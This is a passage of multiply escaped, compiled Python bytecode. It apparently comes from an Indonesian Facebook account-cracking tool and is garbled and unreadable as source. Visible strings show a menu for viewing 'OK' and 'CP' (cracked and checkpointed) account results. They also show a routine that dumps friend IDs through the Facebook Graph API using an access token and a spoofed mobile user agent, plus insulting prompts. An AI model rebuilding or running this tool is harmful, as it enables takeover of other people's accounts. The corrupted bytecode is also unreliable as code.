\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\010\\\\\\\\240\\\\\\\\td\\\\\\\\r\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\n\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\220\\\\\\\\005q\\\\\\\\\\\\\\\"d\\\\\\\\013}\\\\\\\\002i\\\\\\\\000}\\\\\\\\003|\\\\\\\\001D\\\\\\\\000]\\\\\\\\336}\\\\\\\\004z\\\\\\\\026t\\\\\\\\014d!|\\\\\\\\004\\\\\\\\027\\\\\\\\000d\\\\\\\\017\\\\\\\\203\\\\\\\\002\\\\\\\\240\\\\\\\\r\\\\\\\\241\\\\\\\\000}\\\\\\\\005W\\\\\\\\000n\\\\\\\\032\\\\\\\\004\\\\\\\\000t\\\\\\\\016\\\\\\\\220\\\\\\\\003yH\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\"\\\"\\\\\\\\001\\\\\\\\000Y\\\\\\\\000\\\\\\\\220\\\\\\\\003q\\\\\\\\024Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000|\\\\\\\\002d\\\\\\\\0207\\\\\\\\000}\\\\\\\\002|\\\\\\\\002d\\\\\\\\021k\\\\\\\\000\\\\\\\\220\\\\\\\\003r\\\\\\\\266d\\\\\\\\\\\\\\\"t\\\\\\\\017|\\\\\\\\002\\\\\\\\203\\\\\\\\001\\\\\\\\027\\\\\\\\000}\\\\\\\\006|\\\\\\\\003\\\\\\\\240\\\\\\\\020t\\\\\\\\017|\\\\\\\\002\\\\\\\\203\\\\\\\\001t\\\\\\\\017|\\\\\\\\004\\\\\\\\203\\\\\\\\001i\\\\\\\\001\\\\\\\\241\\\\\\\\001\\\\\\\\001\"\"\\\\\\\\000|\\\\\\\\003\\\\\\\\240\\\\\\\\020|\\\\\\\\006t\\\\\\\\017|\\\\\\\\004\\\\\\\\203\\\\\\\\001i\\\\\\\\001\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\000d#t\\\\\\\\001\\\\\\\\233\\\\\\\\000d$t\\\\\\\\002\\\\\\\\233\\\\\\\\000d%\\\\\\\\235\\\\\\\\005|\\\\\\\\006|\\\\\\\\004t\\\\\\\\013|\\\\\\\\005\\\\\\\\203\\\\\\\\001f\\\\\\\\003\\\\\\\\026\\\\\\\\000\\\\\\\\203\\\\\\\\001\\\\\\\\001""\\\\\\\\000n:|\\\\\\\\003\\\\\\\\240\\\\\\\\020t\\\\\\\\017|\\\\\\\\002\\\\\\\\203\\\\\\\\001t\\\\\\\\017|\\\\\\\\004\\\\\\\\203\\\\\\\\001i\\\\\\\\001\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\000d\\\\\\\\023t\\\\\\\\001\\\\\\\\233\\\\\\\\000d\\\\\\\\024t\\\\\\\\002\\\\\\\\233\\\\\\\\000d\\\\\\\\025\\\\\\\\235\\\\\\\\005|\\\\\\\\002|\\\\\\\\004t\\\\\\\\013|\\\\\\\\005\\\\\\\\203\\\\\\\\001f\\\\\\\\003\\\\\\\\026\\\\\\\\000\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000\\\\\\\\220\\\\\\\\003q\\\\\\\\024t\\\\\\\\004d&\\\\\\\\203\\\\\\\\001}\\\\\\\\007z\\\\\\\\014|\\\\\\\\003|\\\\\\\\007\\\\\\\\031\\\\\\\\000}\\\\\\\\010W\\\\\\\\000n\\\\\\\\\\\\\\\"\\\\\\\\004\\\\\\\\000t\\\\\\\"\\\\\\\"\\\\\\\\021\\\\\\\\220\\\\\\\\004y*\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\000d\\\\\\\\032\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\n\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000z\\\\\\\\032t\\\\\\\\014d!|\\\\\\\\010\\\\\\\\027\\\\\\\\000d\\\\\\\\017\\\\\\\\203\\\\\\\\002\\\\\\\\240\\\\\\\\022\\\\\\\\241\\\\\\\\000\\\\\\\\240\\\\\\\\023\\\\\\\\241\\\\\\\\000}\\\\\\\\tW\\\\\\\\000n,\\\\\\\\004\\\\\\\\000t\\\\\\\\016\\\\\\\\220\\\\\\\\004yr\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\000d\\\\\\\\t\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\010\\\\\\\\240\\\\\\\\td\\\\\\\\r\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\n\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000d\\\\\\\\013}\\\\\\\\nt\\\\\\\\024t\\\\\\\\013|\\\\\\\\t\\\\\\\\203\\\\\\\\001\\\\\\\\203\\\\\\\\001D\\\\\\\\000]R}\\\\\\\\013|\\\\\\\\t|\\\\\\\\n\\\\\\\\031\\\\\\\\000\\\\\\\\240\\\\\\\\025d\\\\\\\\033\\\\\\\\241\\\\\\\\001}\\\\\\\\014t\\\\\\\\000d\\\\\\\\022\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\000t\\\\\\\\002\\\\\\\\233\\\\\\\\000d\\\\\\\\034t\\\\\\\\001\\\\\\\\233\\\\\\\\000|\\\\\\\\014d\\\\\\\\013\\\\\\\\031\\\\\\\\000\\\\\\\\233\\\\\\\\000d""\\\\\\\\033|\\\\\\\\014d\\\\\\\\020\\\\\\\\031\\\\\\\\000\\\\\\\\233\\\\\\\\000d\\\\\\\\033|\\\\\\\\014d\\\\\\\\r\\\\\\\\031\\\\\\\\000\\\\\\\\233\\\\\\\\000\\\\\\\\235\\\\\\\\010\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000|\\\\\\\\nd\\\\\\\\0207\\\\\\\\000}\\\\\\\\n\\\\\\\\220\\\\\\\\004q\\\\\\\\204t\\\\\\\\000d\\\\\\\\022\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\004t\\\\\\\\002\\\\\\\\233\\\\\\\\000d\\\\\\\\026t\\\\\\\\026\\\\\\\\233\\\\\\\\000d\\\\\\\\035t\\\\\\\\002\\\\\\\\233\\\\\\\\000d\\\\\\\\036\\\\\\\\235\\\\\\\\006\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\n\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000n |\\\\\\\\000d'v\\\\\\\\000\\\\\\\\220\\\\\\\\005r\"\"\\\\\\\\024t\\\\\\\\n\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000n\\\\\\\\016t\\\\\\\\000d\\\\\\\\032\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\n\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000d\\\\\\\\000S\\\\\\\\000)(Nz\\\\\\\\014>> 1. Hasil \\\\\\\\332\\\\\\\\002OKz\\\\\\\\006 Anda z\\\\\\\\014>> 2. Hasil \\\\\\\\332\\\\\\\\002CPz\\\\\\\\021>> 3. Kembali    z\\\\\\\\014\\\\\\\\n>> Pilih : r\\\\\\\\353\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\031>> File Tidak Di Temukan \\\\\\\\351\\\\\\\\003\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\"\\\"\\\\\\\\000z >> Anda Tidak Memiliki Hasil CP \\\\\\\\351\\\\\\\\002\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\003CP/r\\\\\\\\254\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\025\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\362\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\013>> %s. %s (z\\\\\\\\004 %s z\\\\\\\\005Idz )r\\\\\\\\320\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\372\\\\\\\\002] z\\\\\\\\003 [ z\\\\\\\\n Account ]z\\\\\\\\031>> Pilih Yang Bener Bang \\\\\\\\372\\\\\\\\001|z\\\\\\\\003>> z\\\\\\\\013 Klik Enterz\\\\\\\\002 ]r\\\\\\\\352\\\\\\\\000\\\\\\\\000\\\\\\\\000z >> Anda Tidak Mempunyai File OK \\\\\\\\372\\\\\\\\003OK/r\\\\\\\\354\\\\\\\\000\\\\\\\\000""\\\\\\\\000z\\\\\\\\014>> %s. %s ( \\\\\\\\372\\\\\\\\002%sz\\\\\\\\006 Idz )z\\\\\\\\t\\\\\\\\nPilih : )\\\\\\\\001r\\\\\\\\214\\\\\\\\000\\\\\\\\000\\\\\\\\000)\\\\\\\\027r\\\\\\\\013\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\327\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\343\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\326\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\331\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\245\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\007listdir\\\\\\\\332\\\\\\\\021FileNotFoundErrorr\\\\\\\\237\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\010\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\250\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\365\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\265\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\363\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\342\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\335\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\334\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\277\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\266\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\nsplitlines\\\\\\\\332\\\\\\\\005range\\\\\\\\332\\\\\\\\005splitr\\\\\\\\325\\\\\\\\000\\\\\\\\000\\\\\\\\000)\\\\\\\\rZ\\\\\\\\002kzZ\\\\\\\\003vinZ\\\\\\\\003cihZ\\\\\\\\003lolZ\\\\\\\\003isiZ\\\\\\\\003hemZ\\\\\\\\003nomZ\\\\\\\\004geehZ\\\\\\\\003gehZ\\\\\\\\003linZ\\\\\\\\004nocpZ\\\\\\\\004cpkuZ\\\\\\\\006cpkunir\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\"\\\\\\\"\\\\\\\\000\\\\\\\\000r\\\\\\\\243\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\006resultq\\\\\\\\004\\\\\\\\000\\\\\\\\000s\\\\\\\\342\\\\\\\\000\\\\\\\\000\\\\\\\\000\"\"\\\\\\\\000\\\\\\\\001\\\\\\\\026\\\\\\\\001\\\\\\\\026\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\004\\\\\\\\001\\\\\\\\004\\\\\\\\001""\\\\\\\\010\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\026\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\026\\\\\\\\001\\\\\\\\022\\\\\\\\001&\\\\\\\\002\\\\\\\\026\\\\\\\\001\\\\\\\\024\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\001\\\\\\\\n\\\\\\\\377\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\002\\\\\\\\001\\\\\\\\002\\\\\\\\377\\\\\\\\010\\\\\\\\002\\\\\\\\010\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\032\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\020\\\\\\\\001\\\\\\\\016\\\\\\\\001$\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\032\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\n\\\\\\\\002\\\\\\\\004\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\026\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\026\\\"\\\"\\\\\\\\001\\\\\\\\022\\\\\\\\001&\\\\\\\\002\\\\\\\\026\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\020\\\\\\\\001\\\\\\\\014\\\\\\\\377\\\\\\\\002\\\\\\\\377\\\\\\\\010\\\\\\\\003\\\\\\\\010\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\002\\\\\\\\001\\\\\\\\032\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\004\\\\\\\\001\\\\\\\\020\\\\\\\\001\\\\\\\\016\\\\\\\\001\\\\\\\\010\\\\\\\\001.\\\\\\\\001\\\\\\\\014\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\032\\\\\\\\001\\\\\\\\010\\\\\\\\001\\\\\\\\n\\\\\\\\001""\\\\\\\\010\\\\\\\\002\\\\\\\\010\\\\\\\\001r\\\\\\\\007\\\\\\\\001\\\\\\\\000\\\\\\\\000c\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\r\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\n\\\\\\\\000\\\\\\\\000\\\\\\\\000C\\\\\\\\000\\\\\\\\000\\\\\\\\000sJ\\\\\\\\002\\\\\\\\000\\\\\\\\000z t\\\\\\\\000d\\\\\\\\001d\\\\\\\\002\\\\\\\\203\\\\\\\\002\\\\\\\\240\\\\\\\\001\\\\\\\\241\\\\\\\\000}\\\\\\\\000t\\\\\\\\000d\\\\\\\\003d\\\\\\\\002\\\\\\\\203\\\\\\\\002\\\\\\\\240\\\\\\\\001\\\\\\\\241\\\\\\\\000}\\\\\\\\001W\\\\\\\\000n\\\\\\\\030\\\\\\\\004\\\\\\\\000t\\\\\\\\002y8\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\003\\\\\\\\203\\\\\\\\000\"\"\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000z\\\\\\\\020t\\\\\\\\004t\\\\\\\\005d\\\\\\\\004\\\\\\\\203\\\\\\\\001\\\\\\\\203\\\\\\\\001}\\\\\\\\002W\\\\\\\\000n \\\\\\\\004\\\\\\\\000t\\\\\\\\006yj\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\007d\\\\\\\\005\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\003\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000|\\\\\\\\002d\\\\\\\\006k\\\\\\\\000s||\\\\\\\\002d\\\\\\\\007k\\\\\\\\004r\\\\\\\\212t\\\\\\\\007d\\\\\\\\010\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\003\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\010\\\\\\\\240\\\\\\\\t\\\\\\\\241\\\\\\\\000}\\\\\\\\003d\\\\\\\\t}\\\\\\\\004t\\\\\\\\n|\\\\\\\\002\\\\\\\\203\\\\\\\\001D\\\\\\\\000]*}\\\\\\\\005|\\\\\\\\004d\\\\\\\\0067\\\\\\\\000}\\\\\\\\004t\\\\\\\\005d\\\\\\\\nt\\\\\\\\013|\\\\\\\\004\\\\\\\\203\\\\\\\\001\\\\\\\\027\\\\\\\\000d\\\\\\\\013\\\\\\\\027\\\\\\\\000\\\\\\\\203\\\\\\\\001}\\\\\\\\006t\\\\\\\\014\\\\\\\\240\\\\\\\\r|\\\\\\\\006\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000q\\\\\\\\236t\\\\\\\\014D\\\\\\\\000]\\\\\\\\346}\\\\\\\\007z\\\\\\\\254d\\\\\\\\014d\\\\\\\\ri\\\\\\\\001}\\\\\\\\010t\\\\\\\\016t""\\\\\\\\017\\\\\\\\203\\\\\\\\001d\\\\\\\\tk\\\\\\\\002r\\\\\\\\364|\\\\\\\\000d\\\\\\\\016d\\\\\\\\017\\\\\\\\234\\\\\\\\002}\\\\\\\\tn\\\\\\\\n|\\\\\\\\000d\\\\\\\\016d\\\\\\\\017\\\\\\\\234\\\\\\\\002}\\\\\\\\tt\\\\\\\\010j\\\\\\\\020d\\\\\\\\020\\\\\\\\240\\\\\\\\021|\\\\\\\\007\\\\\\\\241\\\\\\\\001|\\\\\\\\t|\\\\\\\\010d\\\\\\\\021|\\\\\\\\001i\\\\\\\\001d\\\\\\\\022\\\\\\\\215\\\\\\\\004\\\\\\\\240\\\\\\\\022\\\\\\\\241\\\\\\\\000}\\\\\\\\n|\\\\\\\\nd\\\\\\\\016\\\\\\\\031\\\\\\\\000d\\\\\\\\023\\\\\\\\031\\\\\\\\000D\\\\\\\\000]P}\\\\\\\\013z.|\\\\\\\\013d\\\\\\\\024\\\\\\\\031\\\\\\\\000d\\\\\\\\025\\\\\\\\027\\\\\\\\000|\\\\\\\\013d\\\\\\\\026\\\\\\\\031\\\\\\\\000\\\\\\\\027\\\\\\\\000}\\\\\\\\014|\\\\\\\\014t\\\\\\\\017v\\\\\\\\000\\\\\\\\220\\\\\\\\001rPn\\\\\\\\nt\\\\\\\\017\\\\\\\\240\\\\\\\"\\\\\\\"\\\\\\\\r|\\\\\\\\014\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000W\\\\\\\\000n\\\\\\\\032\\\\\\\\004\\\\\\\\000t\\\\\\\\023\\\\\\\\220\\\\\\\\001yv\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000\\\\\\\\220\\\\\\\\001q*Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000\\\\\\\\220\\\\\\\\001q*W\\\\\\\\000q\\\\\\\\316\\\\\\\\004\\\\\\\\000t\\\\\\\\024t\\\\\\\\002f\\\\\\\\002\\\\\\\\220\\\\\\\\001y\\\\\\\\226\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000q\\\\\\\\316\\\\\\\\004\\\\\\\\000t\\\\\\\\010j\\\\\\\\025j\\\\\\\\026\\\\\\\\220\\\\\\\\001y\\\\\\\\262\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\003\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000q\\\\\\\\3160\\\\\\\\000q\\\\\\\\316z$t\\\"\\\"\\\\\\\\007d\\\\\\\\027t\\\\\\\\027\\\\\\\\233\\\\\\\\000\\\\\\\\235\\\\\\\\002t\\\\\\\\013t\\\\\\\\016t\\\\\\\\017\\\\\\\\203\\\\\\\\001\\\\\\\\203\\\\\\\\001\\\\\\\\027\\\\\\\\000\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\"\"\\\\\\\\030\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000W\\\\\\\\000nj\\\\\\\\004\\\\\\\\000t\\\\\\\\010j\\\\\\\\025j\\\\\\\\026\\\\\\\\220\\\\\\\\002y""\\\\\\\\n\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\007t\\\\\\\\031\\\\\\\\233\\\\\\\\000\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\007d\\\\\\\\030\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\032\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n<\\\\\\\\004\\\\\\\\000t\\\\\\\\024t\\\\\\\\002f\\\\\\\\002\\\\\\\\220\\\\\\\\002yD\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000\\\\\\\\001\\\\\\\\000t\\\\\\\\007d\\\\\\\\031t\\\\\\\\033\\\\\\\\233\\\\\\\\000d\\\\\\\\032t\\\\\\\\034\\\\\\\\233\\\\\\\\000\\\\\\\\235\\\\\\\\004\\\\\\\\203\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\035\\\\\\\\240\\\\\\\\036d\\\\\\\\033\\\\\\\\241\\\\\\\\001\\\\\\\\001\\\\\\\\000t\\\\\\\\032\\\\\\\\203\\\\\\\\000\\\\\\\\001\\\\\\\\000Y\\\\\\\\000n\\\\\\\\0020\\\\\\\\000d\\\\\\\\000S\\\\\\\\000)\\\\\\\\034Nr\\\\\\\\253\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\254\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\255\\\\\\\\000\\\\\\\\000\\\\\\\\000u\\\\\\\\037\\\\\\\\000\\\\\\\\000\\\\\\\\000 [=] \\\\\\\\330\\\\\\\\271\\\\\\\\330\\\\\\\\257\\\\\\\\330\\\\\\\\257 \\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\204\\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\257\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\252 : z'>> Masukkan Angka Anjing, Malah Huruff r\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\351d\\\\\\\\000\\\\\\\\000\\\\\\\\000z\\\\\\\\022>> Gagal Dump Idz r\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\000u\\\\\\\\031\\\\\\\\000\\\\\\\\000\\\\\\\\000>> \\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\257\\\\\\\\330\\\\\\\\256\\\\\\\\331\\\\\\\\204 \\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\204\\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\257\\\\\\\\331\\\\\\\\212 z\\\\\\\\003 : z\\\\\\\\nuser-agentzoMozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36Z\\\\\\\\007friends)\\\\\\\\002Z\\\\\\\\014access_token\\\\\\\\332\\\\\\\\006fieldsz\\\\\\\\035https://gr""aph.facebook.com/{}r\\\\\\\\260\\\\\\\\000\\\\\\\\000\\\\\\\\000)\\\\\\\\003\\\\\\\\332\\\\\\\\006paramsr\\\\\\\\333\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\260\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\004datar\\\\\\\\262\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\377\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\261\\\\\\\\000\\\\\\\\000\\\\\\\\000u%\\\\\\\\000\\\\\\\\000\\\\\\\\000 \\\\\\\\342\\\\\\\\236\\\\\\\\252 \\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\204\\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\257\\\\\\\\331\\\\\\\\212\\\\\\\\330\\\\\\\\247\\\\\\\\330\\\\\\\\252 \\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\204\\\\\\\\330\\\\\\\\264\\\\\\\\330\\\\\\\\272\\\\\\\\330\\\\\\\\247\\\\\\\\331\\\\\\\\204\\\\\\\\331\\\\\\\\207 z\\\\\\\\033>> Sinyal Loh Kurang Bagu\"\"s z\\\\\\\\002>>z\\\\\\\\031 Pertemanan Tidak Public r\\\\\\\\373\\\\\\\\000\\\\\\\\000\\\\\\\\000)\\\\\\\\037r\\\\\\\\265\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\266\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\306\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\305\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\003intr\\\\\\\\331\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\nValueErrorr\\\\\\\\013\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\271\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\332\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\005\\\\\\\\001\\\\\\\\000\\\\\\\\000r\\\\\\\\335\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\003uidr\\\\\\\\270\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\365\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\"\\\"\\\\\\\\262\\\\\\\\000\\\\\\\\000\\\\\\\"\\\\\\\"\\\\\\\\000r\\\\\\\\272\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\006formatr\\\\\\\\273\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\342\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\277\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\301\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\302\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\327\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\366\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332""\\\\\\\\001Gr\\\\\\\\250\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\326\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\343\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\237\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\010\\\\\\\\000\\\\\\\\000\\\\\\\\000)\\\\\\\\rr\\\\\\\\307\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\310\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\367\\\\\\\\000\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\003sesZ\\\\\\\\002yzZ\\\\\\\\003met\\\\\\\\332\\\\\\\\002kl\\\\\\\\332\\\\\\\\004user\\\\\\\\332\\\\\\\\004headr\\\\\\\\n\\\\\\\\001\\\\\\\\000\\\\\\\\000\\\\\\\\332\\\\\\\\003urlZ\\\\\\\\002xrZ\\\\\\\\003woyr\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\242\\\\\\\\000\\\\\\\\000\\\\\\\\000r\\\\\\\\243\\\\\\\\000\\\\\\\